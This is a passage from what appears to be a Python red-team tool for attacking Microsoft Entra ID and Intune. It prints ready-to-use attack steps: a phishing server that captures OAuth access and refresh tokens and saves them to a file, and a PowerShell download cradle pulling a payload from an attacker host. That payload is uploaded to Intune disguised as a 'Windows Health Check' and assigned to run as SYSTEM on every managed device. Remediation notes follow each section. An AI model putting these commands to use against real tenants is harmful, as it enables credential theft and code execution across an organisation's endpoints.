        print(f"[+] Access token: {{tokens.get('access_token','')[:50]}}...")
        print(f"[+] Refresh token: {{tokens.get('refresh_token','')[:50]}}...")
        open("/tmp/stolen_tokens.json","w").write(str(tokens))
      self.send_response(302)
      self.send_header("Location", "https://office.com")
      self.end_headers()

  HTTPServer(("0.0.0.0", 8443), H).serve_forever()
  EOF

  ── Enumerate illicit consent grants in tenant ────────────────────────
  {Y}Find existing OAuth grants (as admin):{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" \\
    | python3 -m json.tool

  {Y}PowerShell — find over-permissioned apps:{RST}
  Import-Module AzureAD
  Get-AzureADServicePrincipal -All $true | Where-Object {{
    $_.Tags -contains "WindowsAzureActiveDirectoryIntegratedApp"
  }} | Select DisplayName, AppId, PublisherName

  {DIM}High-risk permissions to grant: Mail.Read, Files.Read.All, Directory.Read.All
  Admin-only: Mail.ReadWrite.All, Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory{RST}
""")
        add_finding("OAuth Illicit Consent Grant Attack", "Critical",
                    f"Malicious OAuth app registered to steal delegated permissions from {aad} users",
                    "Enable admin consent workflow (require admin approval); block user consent for apps from unverified publishers; audit OAuth grants monthly; enable MCAS OAuth app policies")

    # ── [12] Intune Abuse ─────────────────────────────────────────────────────────
    elif c == "12":
        print(f"""
  {C}Microsoft Intune / Endpoint Manager Abuse:{RST}

  {DIM}Intune manages all enrolled devices. Admin access → run scripts on all corp devices.
  Intune admin = effectively Domain Admin for managed workstations.{RST}

  ── Intune enumeration ────────────────────────────────────────────────
  {Y}List managed devices:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/deviceManagement/managedDevices?\\$select=deviceName,operatingSystem,userPrincipalName,lastSyncDateTime" \\
    | python3 -c "
  import sys,json
  for d in json.load(sys.stdin).get('value',[]):
    print(f'{{d[\"deviceName\"]}} | {{d[\"operatingSystem\"]}} | {{d[\"userPrincipalName\"]}}')
  "

  {Y}List device configurations / compliance policies:{RST}
  curl -H "Authorization: Bearer {_tok}" \\
    "https://graph.microsoft.com/v1.0/deviceManagement/deviceConfigurations" \\
    | python3 -m json.tool

  ── Deploy script to all managed devices ──────────────────────────────
  {Y}Upload malicious PowerShell script to Intune:{RST}
  # Base64 encode payload:
  SCRIPT=$(echo 'IEX(New-Object Net.WebClient).DownloadString("http://<attacker>/payload.ps1")' \\
    | iconv -t utf-16le | base64 -w0)

  curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/deviceManagement/deviceManagementScripts" \\
    -d "{{
      \\"displayName\\": \\"Windows Health Check\\",
      \\"description\\": \\"Routine maintenance script\\",
      \\"scriptContent\\": \\"$SCRIPT\\",
      \\"runAsAccount\\": \\"system\\",
      \\"enforceSignatureCheck\\": false,
      \\"fileName\\": \\"health_check.ps1\\",
      \\"roleScopeTagIds\\": []
    }}"

  {Y}Assign script to all devices:{RST}
  curl -X POST -H "Authorization: Bearer {_tok}" \\
    -H "Content-Type: application/json" \\
    "https://graph.microsoft.com/v1.0/deviceManagement/deviceManagementScripts/<script_id>/assign" \\
    -d '{{"deviceManagementScriptAssignments":[{{"target":{{"@odata.type":"#microsoft.graph.allDevicesAssignmentTarget"}}}}]}}'

  {Y}AADInternals — Intune autopilot abuse:{RST}
  Import-Module AADInternals
  # Join device to Entra ID with fake device info:
  Join-AADIntDeviceToAzureAD -DeviceName "CORP-WS-001" -DeviceType "Windows" \\
    -OSVersion "10.0.19041.0" -JoinType "Register"

  {DIM}Intune script runs as SYSTEM on all enrolled Windows devices.
  This effectively provides code execution across all managed endpoints.{RST}
""")
        add_finding("Intune / Endpoint Manager Script Deployment", "Critical",
                    f"Malicious script deployed to all Intune-managed devices in {aad} via Graph API",
                    "Restrict Intune admin role; require MFA + PIM for Intune access; audit script assignments; monitor deviceManagementScripts Graph API calls")

    pause()
